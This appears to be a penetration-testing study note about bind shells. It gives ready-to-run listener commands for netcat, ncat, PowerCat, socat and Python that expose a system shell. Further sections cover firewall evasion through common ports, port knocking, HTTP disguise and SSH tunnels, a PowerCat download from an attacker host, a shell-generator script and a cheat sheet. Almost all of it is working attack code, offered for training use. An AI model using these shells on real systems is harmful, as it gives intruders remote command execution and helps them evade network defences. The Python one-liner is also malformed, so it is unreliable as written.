---
tags: [module/shells-payloads, bind-shell, netcat, ncat, powercat, firewall-evasion, level/advanced, practical]
---

# Bind Shells - Practical Application

## Complete Bind Shell Workflow

Phase 1: Netcat Bind Shells
Phase 2: Ncat Advanced Features
Phase 3: PowerCat (PowerShell)
Phase 4: Socat Bind Shells
Phase 5: Python Bind Shells
Phase 6: Firewall Evasion
Phase 7: Automation

---

## Phase 1: Netcat Bind Shells

### Basic Netcat Bind Shell

**On Target (Linux):**
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l TARGET-IP 7777 > /tmp/f

**On Attacker:**
nc -nv TARGET-IP 7777

### Netcat Bind Shell (Windows)

**On Target (Windows - requires nc.exe):**
nc -lvnp 4444 -e cmd.exe

**On Attacker:**
nc -nv TARGET-IP 4444

### Netcat Without -e (Linux)

Some netcat versions don't have the -e flag. Use this instead:

mkfifo /tmp/fifo; cat /tmp/fifo | /bin/sh -i 2>&1 | nc -l -p 4444 > /tmp/fifo

### Multiple Connections

# Allow multiple connections (loops)
while true; do nc -l -p 4444 -e /bin/bash; done

---

## Phase 2: Ncat Advanced Features

### Ncat Bind Shell (SSL Encrypted)

**On Target:**
ncat --ssl -lvnp 4444 -e /bin/bash

**On Attacker:**
ncat --ssl -nv TARGET-IP 4444

### Ncat with Connection Brokering

# On broker machine
ncat --broker --listen -p 5555

# On target (connects to broker)
ncat BROKER-IP 5555 --keep-open --exec "/bin/bash"

# On attacker (connects to broker)
ncat BROKER-IP 5555

### Ncat with Access Control

# Allow only specific IP
ncat -lvnp 4444 --allow 10.10.14.5 -e /bin/bash

# Allow IP range
ncat -lvnp 4444 --allow 10.10.14.0/24 -e /bin/bash

### Ncat with Rate Limiting

ncat -lvnp 4444 --rate-limit 1000 -e /bin/bash

---

## Phase 3: PowerCat (PowerShell)

### PowerCat Bind Shell

# Download PowerCat
Invoke-WebRequest -Uri "http://10.10.14.5/powercat.ps1" -OutFile powercat.ps1

# Import module
Import-Module .\powercat.ps1

# Start bind shell
powercat -l -p 4444 -e cmd.exe

### PowerCat Encrypted

# Generate SSL cert
powercat -l -p 4444 -e cmd.exe -s

### PowerCat with Payload Generation

# Generate payload to file
powercat -l -p 4444 -e cmd.exe -g > bind.ps1

# Generate base64 encoded payload
powercat -l -p 4444 -e cmd.exe -ge > bind.ps1.b64

---

## Phase 4: Socat Bind Shells

### Socat Basic Bind Shell

**On Target:**
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

**On Attacker:**
socat TCP:TARGET-IP:4444 -

### Socat with SSL

# Generate certificate
openssl req -new -x509 -keyout key.pem -out cert.pem -days 365 -nodes

# Combine cert and key
cat key.pem cert.pem > server.pem

# On target (SSL listener)
socat OPENSSL-LISTEN:4444,cert=server.pem,verify=0,fork EXEC:/bin/bash

# On attacker
socat OPENSSL:TARGET-IP:4444,verify=0 -

### Socat with PTY

socat TCP-LISTEN:4444,fork EXEC:'/bin/bash -i',pty,setsid,ctty

---

## Phase 5: Python Bind Shells

### Python Bind Shell

python -c 'exec("import socket, subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1);s.bind((\"0.0.0.0\",4444));s.listen(1);conn,addr=s.accept();while 1:data=conn.recv(1024);if data==\"exit\\n\":conn.close();else:proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);conn.send(proc.stdout.read()+proc.stderr.read())")'

### Python Bind Shell (Simplified)

import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
os.dup2(conn.fileno(), 0)
os.dup2(conn.fileno(), 1)
os.dup2(conn.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])

---

## Phase 6: Firewall Evasion

### Using Common Ports

# Use port 80 (HTTP)
nc -lvnp 80 -e /bin/bash

# Use port 443 (HTTPS)
nc -lvnp 443 -e /bin/bash

# Use port 53 (DNS)
nc -lvnp 53 -e /bin/bash

### Port Knocking Sequence

# On target (setup port knocking)
for port in 1234 2345 3456; do
    nc -l -p $port -c "echo $port >> /tmp/knock"
done

# After knock sequence, start listener on real port
if [ $(wc -l < /tmp/knock) -eq 3 ]; then
    nc -lvnp 4444 -e /bin/bash
fi

### Bind Shell Over HTTP

# Using netcat with HTTP disguise
while true; do
    { echo -ne "HTTP/1.1 200 OK\r\nContent-Length: $(wc -c < response)\r\n\r\n"; cat response; } | nc -l -p 80
done

### Bind Shell Over SSH Tunnel

# On target (create SSH tunnel to attacker)
ssh -R 4444:localhost:4444 attacker@10.10.14.5

# On attacker (local listener)
nc -lvnp 4444 -e /bin/bash

---

## Phase 7: Automation

### Bind Shell Generator Script

Save as bind-shell-gen.py:

#!/usr/bin/env python3
import argparse

def generate_bind_shell(port, shell_type, tool):
    shells = {
        'netcat_linux': f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
        'netcat_windows': f"nc -lvnp {port} -e cmd.exe",
        'ncat': f"ncat -lvnp {port} --ssl -e /bin/bash",
        'powercat': f"powercat -l -p {port} -e cmd.exe",
        'socat': f"socat TCP-LISTEN:{port},fork EXEC:/bin/bash",
        'python': f'''python -c 'exec("import socket, subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1);s.bind((\"0.0.0.0\",{port}));s.listen(1);conn,addr=s.accept();while 1:data=conn.recv(1024);if data==\"exit\\n\":conn.close();else:proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE);conn.send(proc.stdout.read()+proc.stderr.read())")'''
    }
    
    key = f"{tool}_{shell_type}" if tool in ['netcat'] else tool
    if key in shells:
        return shells[key]
    else:
        return "Shell type not found"

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--port', required=True, type=int)
    parser.add_argument('--type', default='linux', choices=['linux', 'windows'])
    parser.add_argument('--tool', default='netcat', choices=['netcat', 'ncat', 'powercat', 'socat', 'python'])
    args = parser.parse_args()
    
    cmd = generate_bind_shell(args.port, args.type, args.tool)
    print("[*] Bind shell command:")
    print(cmd)

### Multi-Platform Bind Shell Handler

Save as bind-handler.sh:

#!/bin/bash
PORT=$1

echo "[*] Starting bind shell handler on port $PORT"

while true; do
    echo "[*] Waiting for connection..."
    nc -lvnp $PORT
    
    if [ $? -eq 0 ]; then
        echo "[+] Connection received"
        echo "[*] Session ended, restarting listener..."
    else
        echo "[-] Listener stopped"
        exit 1
    fi
done

---

## Bind Shell Cheatsheet

| Tool | Target OS | Command |
|------|-----------|---------|
| Netcat | Linux | rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f |
| Netcat | Windows | nc -lvnp 4444 -e cmd.exe |
| Ncat | Linux | ncat -lvnp 4444 --ssl -e /bin/bash |
| Ncat | Windows | ncat -lvnp 4444 --ssl -e cmd.exe |
| PowerCat | Windows | powercat -l -p 4444 -e cmd.exe |
| Socat | Linux | socat TCP-LISTEN:4444,fork EXEC:/bin/bash |
| Python | Linux | python -c 'import...' |
| Python | Windows | python -c 'import...' (with cmd.exe) |

---

## Key Takeaways

- Bind shell = target listens, you connect
- Netcat is the basic tool, but has limitations
- Ncat adds SSL, access control, and brokering
- PowerCat brings netcat functionality to PowerShell
- Socat is more powerful for advanced connections
- Python bind shells work when netcat isn't available
- Use common ports (80,443,53) to evade firewalls
- SSL encryption helps avoid detection
- Port knocking can hide your listener
- SSH tunneling can bypass NAT
- Always test your bind shell payloads
- Bind shells are harder to use but sometimes necessary
- Master multiple tools for different situations
